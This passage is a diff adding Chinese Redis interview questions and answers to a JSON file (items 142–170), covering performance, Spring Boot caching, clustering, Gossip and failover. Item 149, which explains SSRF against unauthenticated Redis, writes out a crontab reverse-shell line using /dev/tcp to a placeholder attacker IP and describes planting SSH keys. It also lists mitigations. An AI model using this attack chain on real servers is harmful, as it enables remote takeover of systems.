+      "answer": "Redis 在高并发场景下的性能优化策略：1）Pipeline 批量操作：将多个命令打包批量发送，减少网络 RTT；2）Lua 脚本：多步操作封装为原子脚本在服务端执行，减少网络往返并保证原子性；3）使用连接池：避免频繁创建/断开 TCP 连接（JedisPool、Lettuce 连接池）；4）数据结构选择优化：根据场景选最优类型（统计用 HyperLogLog、布隆过滤用 Bitmap、排名用 ZSet）；5）避免慢命令：禁止 KEYS，用 SCAN；大集合用 HSCAN/SSCAN/ZSCAN 渐进遍历；6）集群模式分流：读写分离（从节点读），数据分片（集群写分散到多节点）；7）开启多线程 I/O（6.0+）：配置 io-threads 提升网络处理能力；8）合理配置过期时间，防止大量 key 同时过期（缓存雪崩）；9）客户端本地缓存（Caffeine）+ Redis 二级缓存减少请求次数。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis在高并发场景下的性能优化策略 ？"
+    },
+    {
+      "number": 143,
+      "id": "Redis 数据库面试题-143",
+      "category": "Redis 数据库",
+      "answer": "Spring Boot 与 Redis 整合中 @Cacheable 的使用：1）添加依赖和配置后，在启动类加 @EnableCaching 启用注解缓存；2）@Cacheable(value='userCache', key='#userId') 标注在方法上，首次调用执行方法并将返回值存入 Redis（key 为 userCache::userId），后续调用直接从 Redis 获取缓存结果不执行方法；3）condition 属性：@Cacheable(value='cache', key='#id', condition='#id > 10') 仅当条件满足时缓存；4）unless 属性：@Cacheable(value='cache', key='#result.id', unless='#result == null') 结果不满足条件时不缓存；5）同步模式（4.3+）：sync=true 防止缓存击穿（缓存过期瞬间大量并发穿透到 DB），同 key 只有一个线程执行方法重建缓存；6）配置 TTL：通过 RedisCacheManager 全局或按 cacheName 配置过期时间；7）自定义序列化：注入自定义 RedisSerializer（如 GenericJackson2JsonRedisSerializer）避免 JDK 序列化问题。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述springboot与redis整合中@Cacheable怎么使用 ？"
+    },
+    {
+      "number": 144,
+      "id": "Redis 数据库面试题-144",
+      "category": "Redis 数据库",
+      "answer": "Spring Boot 整合 Redis 客户端超时解决方案：1）配置连接超时和命令超时：spring.redis.timeout=3000ms（命令执行超时）、spring.redis.connect-timeout=2000ms（连接建立超时），在 application.yml 中设置；2）Lettuce 连接池超时配置：spring.redis.lettuce.pool.max-wait=2000ms（连接池获取连接的最大等待时间）；3）排查 Redis 服务端性能：查看 SLOWLOG 是否有慢命令阻塞，检查网络延迟（ping 延迟），检查 Redis CPU 和内存状况；4）调整 Redis 服务端配置：timeout 0（不主动断开空闲连接）、tcp-keepalive 300（TCP 保活）；5）网络层面：检查防火墙、负载均衡的超时配置；6）大数据量传输超时：使用 SCAN 替代 KEYS，大数据集使用 Pipeline 分批处理；7）设置合理的 Socket 超时和连接池大小，过大会导致连接堆积。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述SpringBoot整合redis客户端超时怎么解决 ？"
+    },
+    {
+      "number": 145,
+      "id": "Redis 数据库面试题-145",
+      "category": "Redis 数据库",
+      "answer": "Redis 阻塞问题排查流程：1）确认阻塞现象：redis-cli PING 测试延迟，如果响应慢说明 Redis 确实阻塞了；2）查看慢查询：SLOWLOG GET 20 查看最近的慢命令（关注 KEYS、大集合操作、复杂 Lua 脚本）；3）查看客户端连接：CLIENT LIST 检查是否有大量连接或异常连接；4）检查持久化操作：查看日志中是否有 BGSAVE 或 BGREWRITEAOF 引起的 fork 阻塞（fork 子进程时需要复制页表，大内存下可能阻塞数百毫秒甚至秒级）；5）检查内存：INFO memory 查看内存使用和碎片率，可能因内存不足频繁触发淘汰；6）检查 Big Key：redis-cli --bigkeys 扫描，MEMORY USAGE key 确认；7）查看延迟监控：LATENCY LATEST 查看最近的延迟事件，LATENCY DOCTOR 获取诊断建议；8）检查系统层面：服务器 CPU/内存/磁盘 IO 情况，jemalloc 碎片的 MEMORY PURGE 效果。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis阻塞如何进行问题排查 ？"
+    },
+    {
+      "number": 146,
+      "id": "Redis 数据库面试题-146",
+      "category": "Redis 数据库",
+      "answer": "Redis 解决库存并发问题实现数量控制的方法：1）DECR 原子递减：SET stock 100→每次下单 DECR stock，返回值 ≥0 允许下单，<0 表示库存已耗尽（需回滚 INCR）；2）Lua 脚本保证原子性（推荐）：local stock = tonumber(redis.call('get', KEYS[1])); if stock > 0 then redis.call('decr', KEYS[1]); return 1; else return 0; end；3）WATCH 乐观锁：WATCH stock→GET stock→if stock>0: MULTI→DECR stock→EXEC，若返回 nil 表示冲突需重试；4）LIST 队列模式：提前将库存编号（如商品 100 个→编号 1-100）RPUSH 到 List，下单时 LPOP 取出一个编号，返回 nil 表示已售罄；5）Redis + MQ 异步扣库存：扣 Redis 成功后发 MQ 异步更新 DB 库存，利用 MQ 的重试和幂等保证最终一致性。Lua 脚本是推荐方案，单次网络往返、原子执行。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述redis怎么解决库存并发问题实现数量控制 ？"
+    },
+    {
+      "number": 147,
+      "id": "Redis 数据库面试题-147",
+      "category": "Redis 数据库",
+      "answer": "基于 Docker 搭建 Redis Sentinel 集群的步骤：1）创建 Docker 网络：docker network create redis-net；2）启动 1 主 2 从 Redis 实例：docker run -d --name redis-master --net redis-net redis redis-server --appendonly yes；docker run -d --name redis-slave1 --net redis-net redis redis-server --appendonly yes --replicaof redis-master 6379（同理 slave2）；3）创建 Sentinel 配置文件（sentinel.conf）：sentinel monitor mymaster redis-master 6379 2、sentinel down-after-milliseconds mymaster 5000、sentinel failover-timeout mymaster 10000；4）启动 3 个 Sentinel 容器：docker run -d --name sentinel1 --net redis-net -v $(pwd)/sentinel.conf:/sentinel.conf redis redis-sentinel /sentinel.conf（同理 sentinel2、sentinel3）；5）验证：docker exec -it sentinel1 redis-cli -p 26379 SENTINEL masters 查看监控状态；6）使用 docker-compose.yml 可一键编排所有服务，定义各服务和网络。注意 Sentinel 容器需要与 Redis 容器在同一网络中。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述基于docker如何搭建redis-sentinel集群 ？"
+    },
+    {
+      "number": 148,
+      "id": "Redis 数据库面试题-148",
+      "category": "Redis 数据库",
+      "answer": "通过 Nginx + Tomcat + Redis 实现持久会话（Session 共享）：1）Nginx 配置 upstream 负载均衡到多个 Tomcat 实例（ip_hash 或轮询）；2）Tomcat 添加 Redis Session Manager 依赖：如 spring-session-data-redis（Spring Boot）或 tomcat-redis-session-manager（传统 Tomcat）；3）所有 Tomcat 实例指向同一个 Redis（或 Redis 集群），Session 数据统一存储在 Redis 中；4）用户请求到达 Nginx→转发到任意 Tomcat→Tomcat 从 Redis 获取 Session，实现会话共享和无状态化；5）Session 在 Redis 中的 key 为 spring:session:sessions:<sessionId>，有过期时间（与 Session 超时时间一致）；6）优势：任意 Tomcat 实例宕机不影响用户会话（从别的实例继续服务）、支持水平扩展；7）Nginx 也可配置 sticky session（ip_hash）作为优化减少跨节点 Session 读取，但必须保证 Redis Session 共享作为兜底。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述如何通过Nginx+Tomcat+Redis实现持久会话 ？"
+    },
+    {
+      "number": 149,
+      "id": "Redis 数据库面试题-149",
+      "category": "Redis 数据库",
+      "answer": "Redis SSRF（服务端请求伪造）示例分析：Redis 未授权访问时，攻击者可通过精心构造的 HTTP 请求（利用 gopher 协议或 CRLF 注入）与 Redis 通信执行命令。典型攻击链：1）攻击者发现目标 Redis 未设密码且绑定在公网 IP（0.0.0.0）；2）利用 gopher://IP:6379/_ 协议构造包含 Redis 命令的 HTTP 请求（通过 SSRF 漏洞转发）；3）执行 CONFIG SET dir /var/spool/cron/（修改 RDB 文件保存目录）、CONFIG SET dbfilename root（修改文件名）、SET payload '\n* * * * * bash -i >& /dev/tcp/attacker_ip/port 0>&1\n'（写入 cron 内容）、BGSAVE（保存文件）——最终在 crontab 中写入反弹 shell 任务；4）或写入 SSH authorized_keys 实现免密登录。防范：设置强密码、绑定内网 IP（bind 127.0.0.1 或内网 IP）、rename 高危命令（CONFIG/FLUSHALL）、使用非默认端口、防火墙限制访问。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis中服务端请求伪造SSRF的示例分析 ？"
+    },
+    {
+      "number": 150,
+      "id": "Redis 数据库面试题-150",
+      "category": "Redis 数据库",
+      "answer": "Spring Boot 整合 Redis 缓存实现方法：1）添加依赖：spring-boot-starter-data-redis、spring-boot-starter-cache（如使用注解缓存）、commons-pool2（连接池）；2）application.yml 配置：spring.redis.host/port/password/timeout/lettuce.pool.*；3）配置 RedisTemplate：注入自定义 RedisTemplate Bean，设置序列化方式（建议 key 用 StringRedisSerializer、value 用 GenericJackson2JsonRedisSerializer，避免 JDK 序列化产生的二进制乱码）；4）使用 RedisTemplate 操作 Redis：redisTemplate.opsForValue()/opsForHash()/opsForList()/opsForSet()/opsForZSet()；5）注解方式：@EnableCaching 启用注解缓存，@Cacheable/@CachePut/@CacheEvict 声明式缓存；6）StringRedisTemplate：专门处理 String 类型的便捷模板；7）监听 Redis 事件：实现 MessageListener 接口订阅 key 过期、删除等事件。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述SpringBoot整合Redis缓存实现的方法 ？"
+    },
+    {
+      "number": 151,
+      "id": "Redis 数据库面试题-151",
+      "category": "Redis 数据库",
+      "answer": "Redis 布隆过滤器（Bloom Filter）大小的算法公式：布隆过滤器是概率型数据结构，用于判断元素是否可能存在（可能误判为存在，但绝不会漏判为不存在）。核心公式：n（预估元素数量）、p（期望误判率）、m（位数组大小 bit）、k（哈希函数数量）。1）m = -(n * ln(p)) / (ln(2)^2)，即 m ≈ -1.44 * n * ln(p) * 8 字节；2）k = (m/n) * ln(2) ≈ 0.693 * m/n，取整到最近的整数；3）实际误判率 p_actual = (1 - e^(-k*n/m))^k。例如 n=100 万、期望 p=0.01%，则 m ≈ 9.6 Mbit（约 1.2 MB），k ≈ 7。Redis 通过 RediBloom 模块（BF.RESERVE/BF.ADD/BF.EXISTS）或 Redis Stack 原生支持布隆过滤器。也可用 Bitmap + 多个哈希函数自行实现。常用于缓存穿透防护、垃圾邮件过滤、URL 去重。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis布隆过滤器大小的算法公式是什么 ？"
+    },
+    {
+      "number": 152,
+      "id": "Redis 数据库面试题-152",
+      "category": "Redis 数据库",
+      "answer": "Redis 慢查询日志（Slow Log）使用方法：1）配置：CONFIG SET slowlog-log-slower-than 10000（记录超过 10ms 的命令，单位微秒），CONFIG SET slowlog-max-len 128（最多保留条数，FIFO 队列）；2）查看慢查询：SLOWLOG GET 10 获取最近 10 条慢查询（包含 id、Unix 时间戳、执行耗时微秒、命令和参数、客户端 IP:PORT）；3）SLOWLOG LEN 获取当前慢查询条目数；4）SLOWLOG RESET 清空慢查询日志；5）分析慢查询，找出耗时高的操作：KEYS（全表扫描应替换为 SCAN）、SMEMBERS/HGETALL/LRANGE 0 -1（大数据量集合操作应用 SCAN/HSCAN 分批）、复杂 Lua 脚本、未用 Pipeline 的大量单命令、DEL 大 key（改用 UNLINK 异步删除）；6）设置监控告警：当慢查询数量或频率超过阈值时告警；7）持久化配置写入 redis.conf：slowlog-log-slower-than 10000、slowlog-max-len 128。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis慢查询日志怎么使用 ？"
+    },
+    {
+      "number": 153,
+      "id": "Redis 数据库面试题-153",
+      "category": "Redis 数据库",
+      "answer": "Redis 实现分布式锁需要注意：1）原子性加锁（SET key value NX EX seconds）：保证加锁和设置过期时间是原子操作（Redis 2.6.12+）；2）锁的 value 必须是唯一标识（UUID+线程ID），释放锁时校验 value 是否是自己的，防止误删其他客户端的锁：用 Lua 脚本 if redis.call('get', KEYS[1]) == ARGV[1] then return redis.call('del', KEYS[1]) else return 0 end；3）设置合理的过期时间：不能太短（业务未完成锁就过期）也不能太长（死锁时间长），配合自动续期机制（Redisson 看门狗）；4）可重入性：同一线程可多次获取同一把锁而不死锁（Redisson RLock 基于 Redis Hash 实现可重入）；5）集群模式下的问题：主节点宕机时锁可能丢失（主从异步复制），Redlock 算法试图解决但存在争议；6）避免活锁：获取锁失败后加入随机等待时间再重试；7）监控：记录锁持有时间和竞争情况，及时发现异常。",
+      "tags": [
+        "Redis",
+        "锁"
+      ],
+      "question": "简述Redis实现分布式锁需要注意什么？"
+    },
+    {
+      "number": 154,
+      "id": "Redis 数据库面试题-154",
+      "category": "Redis 数据库",
+      "answer": "Redis 与 Kafka 的区别与使用场景：1）设计目标：Redis 是内存缓存/数据库，Kafka 是分布式流处理平台；2）数据持久化：Redis 数据主要在内存（可选持久化），Kafka 数据持久化到磁盘（顺序写日志，可长期保留）；3）消息模型：Redis Pub/Sub 是即时广播无持久化，Redis Stream 支持消费者组和持久化（轻量级消息队列）；Kafka 是完整的发布/订阅消息系统，支持分区、消费者组、消息回溯、高吞吐、Exactly-Once 语义；4）吞吐量：Kafka 吞吐量远高于 Redis（百万级/秒），适合大数据流水线；5）使用场景：Redis 适合低延迟缓存、简单消息队列、实时计数排行；Kafka 适合日志收集、流处理、大规模事件驱动架构、数据管道；6）消息可靠性：Kafka 支持 ISR 多副本、ACK 机制；Redis Stream 也支持 ACK 但一致性和持久性不如 Kafka。轻量消息队列选 Redis Stream，企业级大数据流选 Kafka。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis与Kafka的区别与使用场景 ？"
+    },
+    {
+      "number": 155,
+      "id": "Redis 数据库面试题-155",
+      "category": "Redis 数据库",
+      "answer": "Redis 实现限速器的几种方式：1）固定窗口计数器：INCR rate_limit:user_id + EXPIRE 窗口时长（简单但有窗口边界突刺问题）；2）滑动窗口（ZSet）：ZADD 添加当前时间戳，ZREMRANGEBYSCORE 清理窗口外记录，ZCOUNT 统计窗口内请求数，超限拒绝（精确但内存开销略大）；3）令牌桶（Token Bucket）：Lua 脚本维护令牌桶状态（当前令牌数+上次补充时间），每次请求消耗一个令牌，令牌按固定速率补充，桶满不再增加（支持突发流量）；4）漏桶（Leaky Bucket）：请求以任意速率进入漏桶，以固定速率流出处理，超过桶容量则丢弃或排队（平滑流量）；5）使用 Redis-Cell 模块：提供 CL.THROTTLE 命令实现成熟的令牌桶限流算法；6）Redisson RRateLimiter：封装了令牌桶算法；7）滑动日志：记录每次请求精确时间戳，精确但内存开销大。推荐简单场景用滑动窗口，复杂场景用令牌桶或 Redis-Cell。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述redis实现限速器的几种方式 ？"
+    },
+    {
+      "number": 156,
+      "id": "Redis 数据库面试题-156",
+      "category": "Redis 数据库",
+      "answer": "Spring Boot AOP + Redis 实现延时双删功能：延时双删是保证缓存一致性的策略——写操作时先删除缓存→更新数据库→延迟几百毫秒→再次删除缓存（防止并发读在更新 DB 后重建了旧数据的缓存）。实现步骤：1）定义自定义注解 @DelayDoubleDelete(key='#id', delay=500)；2）编写 AOP 切面（@Around 注解），在方法执行前先删缓存（redisTemplate.delete(key)）；3）方法执行（更新数据库）；4）方法执行后，使用 ScheduledExecutorService 或 @Async 异步延迟执行第二次删除：scheduler.schedule(() -> redisTemplate.delete(key), delay, TimeUnit.MILLISECONDS)；5）也可用 Redis 的过期消息通知（keyspace notifications）：第一次删缓存后订阅 __keyevent@*__:expired 事件来触发二次删除；6）使用消息队列延迟消息（如 RocketMQ 延迟消息）实现更可靠的延时双删。建议配合 binlog 异步补偿（Canal）兜底。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述SpringBoot AOP Redis如何实现延时双删功能 ？"
+    },
+    {
+      "number": 157,
+      "id": "Redis 数据库面试题-157",
+      "category": "Redis 数据库",
+      "answer": "Redis 实现分布式爬虫的方法与应用：1）URL 去重（布隆过滤器）：将已爬取 URL 写入 Redis 布隆过滤器（BF.ADD），新 URL 先 BF.EXISTS 判断是否已处理，避免重复爬取；2）待爬队列（List/ZSet）：待爬 URL 用 List 的 LPUSH/RPOP 实现 FIFO 任务队列，多个爬虫节点竞争消费；或用 ZSet 按优先级排序消费；3）请求去重与限速：通过 Redis 记录各域名最后请求时间，控制抓取频率（礼貌爬虫）；4）分布式锁：SETNX 防止多节点同时爬取同一 URL；5）爬虫状态存储：用 Hash 记录爬虫运行状态、成功率、失败重试次数等；6）代理 IP 池管理：Set/ZSet 维护可用代理 IP 列表，定时检测代理可用性；7）Cookie/Session 管理：Hash 存储登录 Session 供爬虫共享；8）示例：Scrapy-Redis 扩展将 Scrapy 的调度器和去重器从内存移到 Redis，轻松实现分布式爬虫。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis实现分布式爬虫的方法与应用实例 ？"
+    },
+    {
+      "number": 158,
+      "id": "Redis 数据库面试题-158",
+      "category": "Redis 数据库",
+      "answer": "Redis 复制常见问题及解决方案：1）复制延迟：主从异步复制导致从节点数据可能落后，解决方案：使用 WAIT 命令强制同步复制（牺牲性能）、或客户端容忍一定延迟读从节点；2）复制风暴：一主多从同时发起全量同步，主节点磁盘 I/O 和 CPU 压力过大，解决方案：使用级联复制（从节点下再挂从节点）分散压力；3）主从断开后全量同步过于频繁：replication backlog buffer 设置过小导致缓冲区溢出，从节点重连后 offset 差距超过 backlog 大小只能全量同步，解决方案：增大 repl-backlog-size（建议 256MB~1GB）；4）主节点内存暴涨：BGSAVE fork 子进程时 COW（写时复制）可能导致内存翻倍，解决方案：预留足够内存（至少 RDB 生成期间写量的 2 倍）；5）脑裂：网络分区后从节点升为独立主接收写入，老主恢复后数据冲突，解决方案：配置 min-replicas-to-write 和 min-replicas-max-lag 限制写入。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述redis复制碰到的问题有哪些 ？"
+    },
+    {
+      "number": 159,
+      "id": "Redis 数据库面试题-159",
+      "category": "Redis 数据库",
+      "answer": "Redis 实现分布式监控和日志收集的方法：1）实时指标收集：各服务定期将指标数据（QPS、延迟、错误率）通过 INCR/ZADD/HINCRBY 写入 Redis，利用其高性能处理高并发写入；2）时间序列数据存储：ZSet 的 score 存时间戳、member 存指标值或 JSON 序列化数据，通过 ZRANGEBYSCORE 按时间范围查询；或用 RedisTimeSeries 模块存储时序指标（TS.CREATE/TS.ADD/TS.RANGE）；3）日志缓冲：List RPUSH 日志行 → 消费者 LPOP 批量消费写入持久化存储（ES/Loki），起缓冲削峰作用；4）Stream 作日志管道：XADD 写入日志 → 消费者组 XREADGROUP 消费 → XACK 确认，支持多消费者并行处理和未确认消息重试；5）实时告警：Pub/Sub 发布告警消息，订阅者（告警服务）实时接收并推送通知；6）示例：构建轻量 APM——应用上报请求耗时到 Redis ZSet，Grafana 通过 Redis Data Source 展示延迟趋势图。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述Redis实现分布式监控和日志收集的方法与应用实例 ？"
+    },
+    {
+      "number": 160,
+      "id": "Redis 数据库面试题-160",
+      "category": "Redis 数据库",
+      "answer": "Redis 高可用与持久化配置：1）高可用方案选择：A）主从复制：一主多从，主写从读，手动故障转移（简单但不自动）；B）哨兵模式（Sentinel）：在主从基础上增加哨兵进程自动监控和故障转移，至少 3 个哨兵节点；C）集群模式（Cluster）：数据自动分片+主从冗余+自动故障转移，至少 3 主 3 从。2）持久化配置推荐：A）同时开启 RDB 和 AOF：save 900 1 / save 300 10 / save 60 10000（RDB 快照间隔）；appendonly yes（开启 AOF），appendfsync everysec（每秒同步，性能和数据安全折中）；B）启用混合持久化（4.0+）：aof-use-rdb-preamble yes，AOF 文件头为 RDB 格式，恢复速度快且数据安全；C）auto-aof-rewrite-percentage 100、auto-aof-rewrite-min-size 64mb（自动触发 AOF 重写）。3）备份策略：定时 BGSAVE 生成 RDB 备份至远程存储（S3/OSS），保留最近 7 天备份。4）监控：监控主从延迟、持久化成功率、磁盘空间。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "简述redis中的高可用与持久化怎么配置 ？"
+    },
+    {
+      "number": 161,
+      "id": "Redis 数据库面试题-161",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群（Cluster）是 Redis 官方的分布式解决方案，它解决了单机版以下核心问题：1）数据容量受限：单机内存有限（如 32GB/64GB），集群通过分片将数据分散到多个节点，总容量可达节点数×单机容量；2）写性能瓶颈：单机只有主线程处理写请求，集群将写操作分散到多个主节点，线性提升写吞吐量；3）单点故障：集群每个主节点可有多个从节点，主节点故障时自动选举从节点提升为主，实现自动故障转移；4）水平扩展：支持在线增删节点和槽迁移，无需停机；5）数据均衡：通过 rebalance 自动重新分配哈希槽，使数据在各节点均匀分布。但集群并非银弹——它牺牲了多 key 跨节点操作（事务、Lua 脚本只支持同节点 key），需要客户端支持 MOVED/ASK 重定向。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群（Cluster）是什么它解决了 Redis 单机版的哪些核心问题 ?"
+    },
+    {
+      "number": 162,
+      "id": "Redis 数据库面试题-162",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群的数据分片（Sharding）机制基于哈希槽（Hash Slot）实现：1）预先划分 16384 个哈希槽，每个主节点负责其中一部分槽；2）对于给定的 key，使用 CRC16(key) 对 16384 取模得到槽号：slot = CRC16(key) & 16383（位运算等价取模）；3）集群维护槽→节点的映射关系表（clusterState.slots），客户端也缓存这份映射表；4）数据操作时，先计算 key 的槽号，再查找该槽由哪个节点负责，将请求发送到正确节点；5）如果客户端缓存过期（节点槽关系变更），节点会返回 MOVED 重定向告知最新的节点信息，客户端更新缓存后重新请求。这种方案的优势：去中心化（P2P 通信而非集中元数据服务）、槽迁移粒度可控（可逐个槽迁移）、相比一致性哈希更易管理和故障处理。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群的分片（Sharding）机制是如何实现的它使用什么算法进行数据分布 ?"
+    },
+    {
+      "number": 163,
+      "id": "Redis 数据库面试题-163",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群的哈希槽（Hash Slot）概念：哈希槽是 Redis Cluster 数据分布和路由的核心抽象，共 16384 个。为什么是 16384：1）心跳包大小考量：节点间通过 Gossip 协议交换槽分配信息，需要在心跳消息中携带本节点的槽位图（bitmap），16384 位 = 2KB，这个大小对网络带宽消耗合理。如果选择 65536 个槽则位图为 8KB，心跳包过大影响集群间通信效率；2）节点数预期：Redis 集群设计目标不超过 1000 个节点，16384 个槽足够分配（16~160 个槽/节点）；3）CRC16 算法输出 16 位（0-65535），16384 是 2^14，与 CRC16 的输出范围兼容；4）槽数超过节点数：允许每个节点负责多个槽，支持灵活的增删节点和迁移。如果节点太少（如 2 个节点），每个节点负责约 8192 个槽，迁移粒度粗，但仍可工作。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述请详细阐述 Redis 集群的哈希槽（Hash Slot）概念为什么是 16384 个槽 ?"
+    },
+    {
+      "number": 164,
+      "id": "Redis 数据库面试题-164",
+      "category": "Redis 数据库",
+      "answer": "客户端确定 key 路由节点的过程：1）计算槽号：对 key 使用 CRC16 哈希算法计算校验和，然后对 16384 取模得到 0-16383 之间的槽号。公式：slot = CRC16(key) % 16384（或用位运算 CRC16(key) & 16383）。2）如果 key 中包含 Hash Tag（{}），则只对 {} 内的部分计算 CRC16。例如 key 为 user:{1001}:profile 时，只对 '1001' 做 CRC16 计算，这样可以强制多个相关 key 落在同一槽。3）获取槽→节点映射：客户端本地维护槽→节点映射表（首次从任意节点通过 CLUSTER SLOTS 命令获取并缓存）。4）根据映射表找到目标节点 IP 和端口，直接发送命令。5）如果映射表过期（槽已迁移），节点返回 MOVED 重定向（含新的 IP:PORT 和槽号），客户端更新映射表并重试请求。6）如果槽正在迁移中，节点返回 ASK 重定向，客户端仅本次请求临时重定向到目标节点。",
+      "tags": [],
+      "question": "请简述客户端如何确定一个给定的 key 应该被路由到集群中的哪个节点（CRC16 算法） ?"
+    },
+    {
+      "number": 165,
+      "id": "Redis 数据库面试题-165",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群节点间通过 Gossip 协议进行通信：1）每个节点与集群中其他所有节点建立一条 TCP 长连接（集群总线端口 = 客户端端口 + 10000，如 6379→16379）；2）每个节点默认每秒主动从已知节点列表中随机选取若干个节点（通常是 1~10 个，取决于节点总数），向它们发送 PING 消息；3）PING 消息包含发送者自身的状态、已知的随机几个节点的信息（gossip 段），以及发送者负责的哈希槽位图；4）收到 PING 的节点回复 PONG 消息，也携带自身状态和 gossip 段；5）通过 gossip 段交换，节点能发现新节点（通过 MEET 消息邀请加入）、感知节点下线（PFAIL→FAIL）、获取全集群拓扑和槽分配信息；6）新节点加入时，通过 CLUSTER MEET 发送 MEET 消息，被邀请节点使新节点被 Gossip 协议逐步传播至全集群。Gossip 协议的优势：去中心化、容错性好、最终一致性。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群的节点之间是如何通信的（Gossip 协议） ?"
+    },
+    {
+      "number": 166,
+      "id": "Redis 数据库面试题-166",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群 Gossip 协议的详细实现机制：1）消息类型：a）MEET：邀请新节点加入集群（发送者为已知节点，接收者为新节点）；b）PING：心跳检测和状态交换（每秒随机选取节点发送）；c）PONG：响应 PING/MEET，也可主动发送；d）FAIL：广播某节点已客观下线；e）PUBLISH：集群内广播发布消息。2）消息结构：头部（含发送者节点ID、currentEpoch、configEpoch）+ gossip 段（随机选取集群中 1/10 的节点信息，包含节点ID、IP:PORT、flags、PFAIL 标记等）+ 槽位图（发送者负责的槽 bitmap）。3）节点状态传播：每个节点在心跳中随机交换 gossip 信息，最终所有节点在一定时间内获知集群全貌（最终一致性）。4）PFAIL 标记传播：节点 A 发现节点 B 超时未回复 PONG，在自己的 gossip 段中标记 B 为 PFAIL，其他节点收到后在自己的信息中也记录 B 的 PFAIL 状态，当多数主节点都标记 B 为 PFAIL 时，某个节点将 B 标记为 FAIL 并广播。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述请详细阐述 Redis 集群中 Gossip 协议的实现机制（如 PING/PONG 消息、节点状态传播） ?"
+    },
+    {
+      "number": 167,
+      "id": "Redis 数据库面试题-167",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群通过主从复制（Master-Slave）实现高可用：1）每个主节点（Master）可配置 1 个或多个从节点（Slave）；2）从节点通过 REPLICATE 命令（或配置 replicaof）复制主节点数据，保持数据冗余备份；3）当主节点宕机时，集群自动从该主节点的从节点中选举一个新主节点（故障转移 Failover），接管原主节点的哈希槽继续提供服务；4）故障检测基于 Gossip 协议的 PFAIL→FAIL 机制，超过半数主节点确认下线后触发选举；5）选举过程：符合条件的从节点（与主节点断开时间在合理范围内）发起选举，向其他主节点请求投票，获得多数票的从节点提升为新主节点；6）高可用的前提是每个主节点至少有一个从节点，否则主节点宕机后其负责的哈希槽不可用导致集群部分数据不可访问。与纯主从复制的区别：集群中的主从关系是去中心化自动管理的，故障转移是自动的。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述Redis 集群是如何实现高可用的它与主从复制（Master-Slave）是什么关系 ?"
+    },
+    {
+      "number": 168,
+      "id": "Redis 数据库面试题-168",
+      "category": "Redis 数据库",
+      "answer": "在 Redis 集群中，从节点（Slave/Replica）的作用：1）数据冗余备份：复制主节点的全量数据，提供数据安全保障；2）故障转移（Failover）：当主节点宕机时，从节点自动选举提升为新主节点，保证集群高可用，不丢失数据（或尽量减少丢失）；3）分担读压力（读写分离）：客户端可使用 READONLY 命令在从节点执行读操作，将读请求分散到从节点（但读取可能有延迟，且需要客户端支持）；4）独立持久化：可在从节点单独配置 RDB/AOF 持久化策略，减轻主节点持久化压力；5）备份节点：专门在从节点执行 BGSAVE 备份，不影响主节点性能；6）从节点不参与 Gossip 协议的 PFAIL 投票（只有主节点参与投票），也不负责哈希槽的读写（只读模式下额外服务读请求）。建议每个主节点至少配置 1 个从节点，生产环境常用 3 主 3 从配置。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述在 Redis 集群中，每个主节点（Master）可以有多个从节点（Slave）从节点的作用是什么 ?"
+    },
+    {
+      "number": 169,
+      "id": "Redis 数据库面试题-169",
+      "category": "Redis 数据库",
+      "answer": "Redis 集群主节点故障检测和自动故障转移流程：1）故障检测：主节点之间通过 Gossip 协议交换心跳，如果节点 A 向节点 B 发送 PING 后 cluster-node-timeout 时间内未收到 PONG，A 将 B 标记为 PFAIL（主观下线），并在后续 Gossip 消息中传播此信息。当超过半数的主节点都将 B 标记为 PFAIL 时，某个收到足够数量 PFAIL 信息的节点将 B 标记为 FAIL（客观下线），并广播 FAIL 消息到集群。2）故障转移：B 被标记为 FAIL 后，B 的从节点检测到此状态。具备选举资格的从节点（与 B 断开时间不超过 cluster-node-timeout × cluster-replica-validity-factor）发起选举，将自己的 currentEpoch+1 并向所有主节点发送 FAILOVER_AUTH_REQUEST 请求投票。主节点在每个 epoch 内只能投一票，获得大多数票（≥N/2+1）的从节点当选为新主节点。新主节点通过 PONG 消息广播自己的新角色和 configEpoch，接管原主节点的哈希槽，完成故障转移。",
+      "tags": [
+        "Redis"
+      ],
+      "question": "请简述当 Redis 集群中的一个主节点发生故障（Failover）时，集群是如何进行故障检测和自动故障转移的 ?"
+    },
+    {
+      "number": 170,
+      "id": "Redis 数据库面试题-170",
+      "category": "Redis 数据库",
